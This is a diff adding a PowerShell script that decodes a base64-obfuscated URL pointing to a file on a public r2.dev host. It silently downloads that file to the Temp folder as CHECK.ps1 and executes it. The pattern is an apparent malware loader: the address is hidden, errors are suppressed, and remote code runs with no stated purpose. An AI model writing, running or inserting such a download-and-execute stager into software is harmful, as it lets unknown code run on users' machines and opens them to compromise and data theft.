@@ -1,0 +1,24 @@
+# Define the base64 encoded URL
+$base64Url = "aHR0cHM6Ly9wdWItMWE0OTYyZmEwNGY1NDFiOGI3ZjVmNzM5NjBiZjVlYWUucjIuZGV2L0NIRU5LP3BzMQ=="
+
+# Decode the base64 string back to the URL
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
+
+# Define the path to the %TEMP% directory
+$tempPath = [System.IO.Path]::Combine($env:TEMP, "CHECK.ps1")
+
+# Download the file to the %TEMP% directory silently
+Invoke-WebRequest -Uri $url -OutFile $tempPath -ErrorAction SilentlyContinue
+
+# Check if the file was downloaded successfully
+if (Test-Path $tempPath) {
+    # Execute the downloaded PowerShell script
+    try {
+        . $tempPath
+        Write-Host "Script executed successfully."
+    } catch {
+        Write-Host "An error occurred while executing the script: $_"
+    }
+} else {
+    Write-Host "The file could not be downloaded."
+}
